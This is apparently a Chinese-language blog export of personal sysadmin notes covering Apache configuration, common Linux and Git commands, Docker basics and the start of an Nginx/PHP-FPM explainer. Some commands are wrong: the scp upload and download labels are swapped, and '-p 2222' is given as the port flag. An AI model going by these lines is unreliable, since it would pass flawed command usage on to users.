<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看哪种 MPM</span><br><span class="line">httpd -l || apachectl -l</span><br><span class="line"># 查看当前的连接数可以用</span><br><span class="line">ps aux | grep httpd | wc -l</span><br><span class="line">#或</span><br><span class="line">pgrep httpd | wc -l</span><br><span class="line"></span><br><span class="line"># 计算httpd占用内存的平均数</span><br><span class="line">ps aux|grep -v grep|awk &#x27;/httpd/&#123;sum+=$6;n++&#125;;END&#123;print sum/n&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="ServerRoot-主机工作目录"><a href="#ServerRoot-主机工作目录" class="headerlink" title="ServerRoot 主机工作目录"></a>ServerRoot 主机工作目录</h3><h3 id="Listen-监听端口"><a href="#Listen-监听端口" class="headerlink" title="Listen 监听端口"></a>Listen 监听端口</h3><h3 id="LoadModule-加载动态模块"><a href="#LoadModule-加载动态模块" class="headerlink" title="LoadModule 加载动态模块"></a>LoadModule 加载动态模块</h3><h3 id="执行用户，包括子进程执行用户"><a href="#执行用户，包括子进程执行用户" class="headerlink" title="执行用户，包括子进程执行用户"></a>执行用户，包括子进程执行用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User daemon</span><br><span class="line">Group daemon</span><br></pre></td></tr></table></figure>

<h3 id="服务器域名"><a href="#服务器域名" class="headerlink" title="服务器域名"></a>服务器域名</h3><pre><code>ServerName  www.gbin.me
</code></pre>
<h3 id="文档目录，网站根目录，也即是域名对应的站点目录"><a href="#文档目录，网站根目录，也即是域名对应的站点目录" class="headerlink" title="文档目录，网站根目录，也即是域名对应的站点目录"></a>文档目录，网站根目录，也即是域名对应的站点目录</h3><pre><code>DocumentRoot /home/www

www.gbin.me &lt;===&gt; /home/www
</code></pre>
<h3 id="目录权限控制"><a href="#目录权限控制" class="headerlink" title="目录权限控制"></a>目录权限控制</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory &quot;/www&quot;&gt;</span><br><span class="line">        Options Indexes FollowSymLinks</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Order allow,deny</span><br><span class="line">        Allow from all</span><br><span class="line">        Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
<pre><code>- Options是对该目录的一些选项, Indexes表示在没有index.html等文件的时候显示文件列表

- AllowOverride All 表示允许使用 .htaccess 文件重写 URL，None  禁止用户覆盖(重载)配置文件
</code></pre>
<h3 id="apache-的安全模块"><a href="#apache-的安全模块" class="headerlink" title="apache 的安全模块"></a>apache 的安全模块</h3><ul>
<li>mod_evasive20( 防DDOS攻击)</li>
<li>mod_limittipconn(针对单站点)配置</li>
<li>mod_security(防止SQL注入)</li>
</ul>
<h3 id="设置目录默认首页"><a href="#设置目录默认首页" class="headerlink" title="设置目录默认首页"></a>设置目录默认首页</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DirectoryIndex index.html index.php #优先级从左往右依次降低</span><br></pre></td></tr></table></figure>

<h3 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ErrorLog &quot;logs/error_log&quot;</span><br></pre></td></tr></table></figure>

<h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CustomLog &quot;logs/access_log&quot; common</span><br></pre></td></tr></table></figure>
<h3 id="解析-php-的脚本"><a href="#解析-php-的脚本" class="headerlink" title="解析 .php 的脚本"></a>解析 .php 的脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure>
<h3 id="控制错误页面的输出"><a href="#控制错误页面的输出" class="headerlink" title="控制错误页面的输出"></a>控制错误页面的输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ErrorDocument 404 /missing.html</span><br></pre></td></tr></table></figure>
<h3 id="包含外部配置文件"><a href="#包含外部配置文件" class="headerlink" title="包含外部配置文件"></a>包含外部配置文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Include etc//extra/httpd-vhosts.conf</span><br></pre></td></tr></table></figure>

<h3 id="虚拟目录"><a href="#虚拟目录" class="headerlink" title="虚拟目录"></a>虚拟目录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alias /var/gbin/ &quot;home/www/gbin&quot; # 虚拟目录（目录别名）</span><br></pre></td></tr></table></figure>
<p>&#x2F;var&#x2F;gbin&#x2F; &#x3D;&#x3D;&gt; &#x2F;home&#x2F;www&#x2F;gbin</p>
<h3 id="ServerSignature-off"><a href="#ServerSignature-off" class="headerlink" title="ServerSignature off"></a>ServerSignature off</h3><h3 id="apache目录文件权限设置-www-www-目录755-文件644"><a href="#apache目录文件权限设置-www-www-目录755-文件644" class="headerlink" title="apache目录文件权限设置(www:www 目录755 文件644)"></a>apache目录文件权限设置(www:www 目录755 文件644)</h3><h3 id="mpm-三种模式"><a href="#mpm-三种模式" class="headerlink" title="mpm 三种模式"></a>mpm 三种模式</h3><ul>
<li>prework<br>Apache2.2版本prefork参数：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule prefork.c&gt;</span><br><span class="line">    StartServers       8    #默认启动的工作进程数；启动时开启的进程数</span><br><span class="line">    MinSpareServers     5    #最少空闲进程数，保存备用；备用进程的最小数目</span><br><span class="line">    MaxSpareServers     20    #最大空闲进程数，保存备用；备用进程的最大数目</span><br><span class="line">    ServerLimit       256    #最大活动进程数</span><br><span class="line">    MaxClients        256    #并发请求的最大数</span><br><span class="line">    MaxRequestsPerChild   4000    #每个子进程在生命周期内所能够服务的最多请求个数；</span><br><span class="line">    #合理配置此参数可以有效避免apache服务器内存溢出</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
<p>   注意：虽然MaxRequestsPerChild缺省设为0可以使每个子进程处理更多的请求，但如果设成非零<br>       值也有两点重要的好处：<br>   1、可防止意外的内存泄漏。<br>   2、在服务器负载下降的时侯会自动减少子进程数。因此，可根据服务器的负载来调整这个值。<br>Apache2.4版本prefork参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mpm_prefork_module&gt;   #如果mpm_prefork_module这个模块被启用</span><br><span class="line">    StartServers        5  #启动时开启的进程数</span><br><span class="line">    MinSpareServers      5   #最少空闲进程数，保存备用；备用进程的最小数目</span><br><span class="line">    MaxSpareServers       10  #最大空闲进程数，保存备用；备用进程的最大数目</span><br><span class="line">    MaxRequestWorkers     250 #并发请求的最大数</span><br><span class="line">    MaxConnectionsPerChild   0   #每个子进程在生命周期内所能够服务的最多请求个数；</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>worker</p>
</li>
<li><p>event</p>
</li>
</ul>
<h3 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h3><h2 id="压测"><a href="#压测" class="headerlink" title="压测"></a>压测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ab -n XXX -c YYY http://hostname.port/path/filename</span><br></pre></td></tr></table></figure>
<p>并发 XXX 个请求 连接数为 YYY</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><p><a href="http://1005969720.blog.51cto.com/9082248/1744452">http://1005969720.blog.51cto.com/9082248/1744452</a></p>
</li>
<li><p><a href="https://www.kancloud.cn/curder/apache/91278">https://www.kancloud.cn/curder/apache/91278</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 命令使用笔记</title>
    <url>/experience/practice/linux-command-note/</url>
    <content><![CDATA[<p>本文记录工作学习中本人没有熟练掌握的 Linux 命令的基本使用方法，便于再次查阅。</p>
<span id="more"></span>

<h3 id="tar-文件解压缩"><a href="#tar-文件解压缩" class="headerlink" title="tar 文件解压缩"></a>tar 文件解压缩</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#压缩</span><br><span class="line">tar -czvf ***.tar.gz</span><br><span class="line">tar -cjvf ***.tar.bz2</span><br><span class="line">#解压缩</span><br><span class="line">tar -xzvf ***.tar.gz</span><br><span class="line">tar -xjvf ***.tar.bz2</span><br></pre></td></tr></table></figure>
<p>参考:<a href="http://www.cnblogs.com/52linux/archive/2012/03/04/2379738.html">http://www.cnblogs.com/52linux/archive/2012/03/04/2379738.html</a></p>
<h3 id="scp-文件传输"><a href="#scp-文件传输" class="headerlink" title="scp 文件传输"></a>scp 文件传输</h3><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ul>
<li><p>上传文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp username@servername:/path/filename /tmp/local_destination</span><br></pre></td></tr></table></figure>

</li>
<li><p>下载文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp /path/local_filename username@servername:/path</span><br></pre></td></tr></table></figure>
</li>
<li><p>上传目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r username@servername:remote_dir/ /tmp/local_dir</span><br></pre></td></tr></table></figure>

</li>
<li><p>下载目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp  -r /tmp/local_dir username@servername:remote_dir</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul>
<li><p>上传走的是 ssh 通道，如果 ssh 端口不是 22 则需要用 -p 指定端口号，如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r -p 2222 username@servername:/path/filename /tmp/local_path</span><br></pre></td></tr></table></figure>

</li>
<li><p>传输目录时，不加 -r 参数会报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp: xxx: not a regular file</span><br></pre></td></tr></table></figure>

</li>
<li><p>本地目录权限不足时，报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp: permission deined</span><br></pre></td></tr></table></figure>

<p>​</p>
</li>
</ul>
<h3 id="xsel-复制内容到剪切板"><a href="#xsel-复制内容到剪切板" class="headerlink" title="xsel 复制内容到剪切板"></a>xsel 复制内容到剪切板</h3><ul>
<li><p>安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install xsel</span><br></pre></td></tr></table></figure>

</li>
<li><p>使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat README.TXT | xsel</span><br><span class="line">cat README.TXT | xsel -b # 如有问题可以试试-b选项</span><br><span class="line">xsel &lt; README.TXT</span><br><span class="line"></span><br><span class="line">xsel -c</span><br></pre></td></tr></table></figure>

</li>
<li><p>step 3: ctr + v 粘贴</p>
</li>
</ul>
<h3 id="查看-Linux-版本"><a href="#查看-Linux-版本" class="headerlink" title="查看 Linux 版本"></a>查看 Linux 版本</h3><ul>
<li>show Linux version : <code>cat /proc/version</code>or <code>cat /etc/redhat-release</code></li>
<li>ubuntu show version: <a href="https://www.jianshu.com/p/bda22f6db7a8">https://www.jianshu.com/p/bda22f6db7a8</a></li>
<li><code>lsb_release -a</code></li>
</ul>
<h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">free -m</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>used&#x3D;total-free <strong>即</strong>total&#x3D;used+free</strong></li>
<li>实际内存占用：**used-buffers-cached **即 <strong>total-free-buffers-cached</strong></li>
<li>实际可用内存：<strong>buffers+cached+free</strong></li>
</ul>
<h2 id="Windwos-也有常用命令"><a href="#Windwos-也有常用命令" class="headerlink" title="Windwos 也有常用命令"></a>Windwos 也有常用命令</h2><ul>
<li><p>Windows 重启网卡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">禁用网卡: netsh interface set interface &quot;本地连接&quot;disabled</span><br><span class="line"></span><br><span class="line">启用网卡: netsh interface set interface &quot;本地连接&quot; enabled</span><br></pre></td></tr></table></figure>

<p>​</p>
</li>
<li><p>Windows CMD 下临时修改环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set path # show path</span><br><span class="line">set path=%path%;C:\Python27\;C:\Python27\Scripts\</span><br></pre></td></tr></table></figure>

<p>​</p>
</li>
</ul>
<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><ul>
<li><p>导入 .sql 文件</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> source xx.sql</span><br></pre></td></tr></table></figure>

<p>​</p>
</li>
</ul>
<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><ul>
<li><p>使用 ss 代理配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy &#x27;socks5://127.0.0.1:1080&#x27; </span><br><span class="line">git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>查看 reflog 和回滚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git reflog</span><br><span class="line">  3f1ff1f HEAD@&#123;0&#125;: commit: archived &lt;reading-note...&gt;</span><br><span class="line">  bb6ffae HEAD@&#123;1&#125;: clone: from https://github.com/brelian/brelian.github.io.git</span><br><span class="line">$ git reset HEAD@&#123;1&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>git pull&#x2F;push<br>有多各分支时，如下使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push origin [local branch]:[remote branch]</span><br><span class="line">git push origin master:hexo  &quot; 将本地 master 分支提交到远程 hexo 分支</span><br></pre></td></tr></table></figure>


<p>​</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 学习笔记（1）</title>
    <url>/experience/practice/linux-learning-docker-I/</url>
    <content><![CDATA[<p>Docker 是一种新的虚拟化技术，随着技术的不断革新 Docker 越来越受开发者的青睐，Docker 给开发带来了诸多方便，如提供如本地开发环境、单元测试环境、构建环境；Docker 还常用语弹性云服务和组件微服务。本文主要介绍 Docker 的基本使用，更多进阶内容我们将在下一节介绍。</p>
<span id="more"></span>

<h2 id="一、认识-Docker"><a href="#一、认识-Docker" class="headerlink" title="一、认识 Docker"></a>一、认识 Docker</h2><h3 id="Linux-容器（LXC）和-Docker"><a href="#Linux-容器（LXC）和-Docker" class="headerlink" title="Linux 容器（LXC）和 Docker"></a>Linux 容器（LXC）和 Docker</h3><p>LXC 是Linux 发展的一种新的虚拟化技术，他的虚拟不是基于硬件层面的，而是对进程的隔离，再正常的进程外面套了一个保护层，封装称一个容器。</p>
<p>Docker 是基于 LXC  的封装，进一步封装了文件系统和网络互联和进程隔离等。Docker 使用 Google 公司推出的 <a href="https://golang.org/">Go 语言</a> 进行开发实现，基于 Linux 内核的 <a href="https://zh.wikipedia.org/wiki/Cgroups">cgroup</a>，<a href="https://en.wikipedia.org/wiki/Linux_namespaces">namespace</a>，以及<a href="https://en.wikipedia.org/wiki/Aufs">AUFS</a> 类的 <a href="https://en.wikipedia.org/wiki/Union_mount">Union FS</a> 等技术，对进程进行封装隔离，属于 <a href="https://en.wikipedia.org/wiki/Operating-system-level_virtualization">操作系统层面的虚拟化技术</a>。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。最初实现是基于 <a href="https://linuxcontainers.org/lxc/introduction/">LXC</a>，从 0.7 版本以后开始去除 LXC，转而使用自行开发的 <a href="https://github.com/docker/libcontainer">libcontainer</a>，从 1.11 开始，则进一步演进为使用 <a href="https://github.com/opencontainers/runc">runC</a> 和 <a href="https://github.com/containerd/**containerd**">containerd</a>。</p>
<p>传统虚拟化技术是基于硬件的虚拟化，与传统虚拟化技术不同，</p>
<p><img src="/images/20180705/virtualization.png"></p>
<p>Docker 是基于操作系统层面的虚拟化技术，</p>
<p><img src="/images/20180705/docker.png"></p>
<p>相比与传统的虚拟化技术，Docker 具有启动快、占用内存小、轻量、可动态扩容等特点，</p>
<p><img src="/images/20180705/Snipaste_2018-07-17_16-58-22.png"></p>
<h3 id="Docker-主要用途"><a href="#Docker-主要用途" class="headerlink" title="Docker 主要用途"></a>Docker 主要用途</h3><ol>
<li><strong>提供一次性环境，如本地开发环境、单元测试环境、构建环境等</strong></li>
<li>弹性云服务，动态扩容</li>
<li>组件微服务架构</li>
</ol>
<h3 id="Docker-基本概念-——-镜像、容器和仓库"><a href="#Docker-基本概念-——-镜像、容器和仓库" class="headerlink" title="Docker 基本概念 —— 镜像、容器和仓库"></a>Docker 基本概念 —— 镜像、容器和仓库</h3><ul>
<li><p>镜像 image<br>  Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p>
</li>
<li><p>容器 Container<br>  容器是镜像的实例，是Docker服务直接操作的对象，容器可以被创建、启动、停止、删除和暂停等。<br>  容器的实质是进程，运行在属于自己的独立的命名空间。<br>  容器以镜像为基础层，并在此基础上创建了一个存储层，容器运行时，大部分读写操作都发生在存储层，存储层的生命周期和容器一致，容器销毁时存储层也随之消毁。</p>
<p>  按照 Docker 的最佳实践，容器存储层不应写入任何有效数据，所有文件的写入操作都应该使用数据卷(Volume)、或者绑定宿主目录，这样数据的读写会直接跳过容器的存储层，直接对宿主（或网络存储）发生读写，其性能和稳定性更加高。因此，数据卷是容器数据持久化的一种设计方案。</p>
</li>
<li><p>仓库 Registry<br>  和 Git 仓库类似，仓库是用与存储镜像的，Docker 中仓库名一般有两段路径构成，如  <code>daocloud.io/nginx</code> 前者是仓库地址，后者是仓库名称，一个仓库中包含多个标签 Tag,每个 Tag 对应一个镜像。</p>
</li>
</ul>
<h2 id="二、Docker-基本使用"><a href="#二、Docker-基本使用" class="headerlink" title="二、Docker 基本使用"></a>二、Docker 基本使用</h2><h3 id="Windows-7-下安装-Docker"><a href="#Windows-7-下安装-Docker" class="headerlink" title="Windows 7 下安装 Docker"></a>Windows 7 下安装 Docker</h3><p>目前 Docker 分为两个发行版，社区版（CE）和企业版（EE），企业版提供一些收费服务，对于我们普通开发者来说，社区版就足以使用，所以我们选择安装社区版就行了。早期的 Docker 是基于 LXC 的，对于 Windows 7，官方提供了 <a href="https://download.docker.com/win/stable/DockerToolbox.exe">Docker Toolbox</a> 集成工具用于支持 Docker。 Docker Toolbox 实际上集成了 VirtualBox、boot2docker 和一些 docker 常用工具，如 git、docker-compose、docker-machine 等。从官方下载 <a href="https://download.docker.com/win/stable/DockerToolbox.exe">Docker ToolBox </a>，安装即可（如需更加详细的安装教程可自行 Google 或百度之），需要注意的是安装路径不应有中文字符。</p>
<p>一般而言，安装完成之后，点击桌面上的 <code>Docker QuickStart Terminal</code> 快捷方式或进入安装目录双击 <code>start.sh</code>启动 Docker 服务。启动 Docker 服务后，使用如下命令查看 Docker 相关信息，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker version</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker info</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/20180705/docker-installation.png"></p>
<p>如图，Docker 分为客户端和服务端，与 Linux 不同的是 Docker 并不是直接运行在 Windows 系统之上的，而是运行在一个轻量级的 Linux 虚拟机上，这个虚拟机就是之前提到的 boot2docker。图中显示的 IP 地址<code>192.169.99.100</code>就是这个虚拟机的 IP，使用 xshell 或类似工具可以 ssh 连接到这台虚拟机上，默认用户名和密码分别是 <code>docker</code>和<code>tcuser</code>。</p>
<p>小试牛刀，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run hello-world</span></span><br></pre></td></tr></table></figure>

<p><code>docker run hello-world</code> 表示启动基于 <code>hello-world</code> 镜像容器，如果本地不存在 <code>hello-world</code>镜像那么将从远程镜像仓库 <a href="https://hub.docker.com/">docker hub</a> 中下载，为了提高下载速度，我们可以手动修改镜像地址为国内镜像。</p>
<ol>
<li><p>修改 <code>profile</code> 文件</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> vi /var/lib/boot2docker/profile</span></span><br></pre></td></tr></table></figure>

<p>  将<code>--registry-mirror=https://registry.docker-cn.com </code>  添加到  <code>EXTRA_ARGS</code>中</p>
</li>
<li><p>重启 docker 服务</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> /etc/init.d/docker restart</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>验证</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker info</span></span><br></pre></td></tr></table></figure>

<p>  ​</p>
</li>
</ol>
<h3 id="镜像管理"><a href="#镜像管理" class="headerlink" title="镜像管理"></a>镜像管理</h3><ol>
<li><p>从远程仓库拉取镜像</p>
<blockquote>
<p>docker pull [选项]  [地址]&#x2F;仓库名:[标签]</p>
</blockquote>
<p>  其中标签是镜像的标识，有点类似与版本号</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker pull ubuntu:16.04</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>查看镜像</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker images</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker image <span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure>

<p>  【注意】从查看结果中有些镜像没有仓库名也没有标签，这写镜像被成为虚悬镜像（dangling image），这些镜像没有名称一般是因为新镜像构建时与旧镜像同名导致旧镜像名称被占用。</p>
<p>  为了加速镜像构建，Docker 会利用中间层镜像，<code>docker image ls</code>只会列出顶层镜像，使用如下命令可以查看到中间层镜像，</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker image <span class="built_in">ls</span> -a</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>删除本地镜像</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker image <span class="built_in">rm</span> [tag|<span class="built_in">id</span>]</span></span><br></pre></td></tr></table></figure>

<p>  前面提到过的虚悬镜像一般来讲，已经失去了存在的价值，可以用如下命令批量删除虚悬镜像，</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker image prune</span></span><br></pre></td></tr></table></figure>

<p>  ​</p>
</li>
</ol>
<h3 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h3><ol>
<li><p>启动一个容器</p>
<blockquote>
<p>docker run [container]</p>
</blockquote>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run hello-world</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -d nginx</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -it --<span class="built_in">rm</span> ubuntu:16.04 bash</span></span><br></pre></td></tr></table></figure>

<ul>
<li>-it：这是两个参数很重要，-t 是启动容器是分配一个伪终端，i 是让容器的标准输入保持打开。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。</li>
<li>–rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 –rm 可以避免浪费空间。</li>
<li>ubuntu:16.04：这是指用 ubuntu:16.04 镜像为基础来启动容器。</li>
<li>bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 bash。</li>
<li>-d 是让容器作为宿主机的后台进程运行。</li>
</ul>
</li>
<li><p>查看容器</p>
<blockquote>
<p>docker container ls 或 docker ps</p>
</blockquote>
</li>
<li><p>停止容器</p>
<blockquote>
<p>docker [container] stop container_id || docker [container] kill container_id</p>
</blockquote>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker container stop 308bb024a63b</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker stop 308bb024a63b</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker container <span class="built_in">kill</span> 308bb024a63b</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">kill</span> 308bb024a63b</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>进入容器</p>
<blockquote>
<p> docker exec [OPTIONS] CONTAINER COMMAND [ARG…][flags]</p>
</blockquote>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">exec</span> -it 124f52960169 bash</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>删除容器</p>
<blockquote>
<p>docker [container] rm container_id</p>
</blockquote>
<p>  彻底从 <code>docker ps -a</code> 列表中删除，<code>docker start</code> 不能启动。</p>
<blockquote>
<p>docker container prune</p>
</blockquote>
<p>  清楚所有停止的容器</p>
</li>
<li><p>保存容器的改变</p>
<blockquote>
<p>docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</p>
</blockquote>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run --name mynginx -d -p 80:80 nginx:alpine</span></span><br></pre></td></tr></table></figure>

<p>  进入容器</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">exec</span> -it mynginx bash</span></span><br><span class="line">OCI runtime exec failed: exec failed: container_linux.go:296: starting container process caused &quot;exec: \&quot;bash\&quot;: executable file not found in $PATH&quot;: unknown</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">exec</span> -it mynginx <span class="built_in">ls</span> /bin/bash</span></span><br><span class="line">ls: /bin/bash: No such file or directory</span><br><span class="line">说明没有 bash，因此可以使用 sh</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">exec</span> -it mynginx sh</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Hello docker&lt;/h1&gt;&lt;/center&gt;&quot;</span> &gt; /usr/share/nginx/html/index.html</span></span><br><span class="line">停止容器、容器的改变不会影响基础镜像，所以再次启动基础镜像时，内容不变</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker stop mynginx</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">rm</span> mynginx</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run --name mynginx -d -p 80:80 nginx:alpine</span></span><br></pre></td></tr></table></figure>

<p>  使用 <code>docker commit</code> 保存容器存储层的改变</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker commit  --author &quot;Syncher&quot;  --message &quot;updated index.html&quot;   mynginx  nginx:alpine</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx 与 PHP-FPM 通信机制</title>
    <url>/experience/practice/linux-nginx-fpm-communication-explaination/</url>
    <content><![CDATA[<p>看完这篇文章，你可以知道</p>
<ul>
<li>PHP-CGI 是 PHP 解析器</li>
<li>CGI 是一种协议</li>
<li>Fast-CGI  是 CGI 的一个变种</li>
<li>PHP-FPM 是对 Fast-CGI 的实现，是对 PHP-CGI 进程的管理</li>
<li>Nginx 和 PHP-FPM 之间的通信方式</li>
</ul>
<span id="more"></span>

<h2 id="Nginx-与-PHP-FPM"><a href="#Nginx-与-PHP-FPM" class="headerlink" title="Nginx 与 PHP-FPM"></a>Nginx 与 PHP-FPM</h2><p>Nginx（服务器）是内容的分发者，Nginx 启动后会监听某个指定的端口，等待客户端请求。如果通过解析 URI 得知客户端请求的是<code>/index.html</code>文件，服务器会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。如果现在请求的是<code>/index.php</code>，根据配置文件，服务器知道这不是静态文件，需要去找 **PHP 解析器 （PHP-CGI）**来处理。PHP-CGI 收到<code>/index.php</code>这个请求后，会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程。Nginx 再把结果返回给浏览器。</p>
